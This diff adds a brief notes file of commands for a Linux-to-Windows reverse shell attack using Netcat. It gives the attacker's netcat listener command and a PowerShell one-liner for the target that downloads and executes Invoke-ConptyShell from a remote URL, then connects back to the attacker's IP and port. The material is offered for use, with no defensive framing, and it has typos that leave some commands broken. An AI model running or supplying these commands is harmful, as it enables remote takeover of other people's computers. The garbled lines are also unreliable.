@@ -1,0 +1,7 @@
+commands for revers shell attack linux to windows using Netcat
+
+attackers command:
+linux command = ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
+
+targets command:
+windows target command = IEX(IWR https://raw.githubsercontent.com/antonioCoco/ConptyShell/master/invoke-ConptyShell.ps1 -useBasicParsing); Invoke-ConptyShell IP port
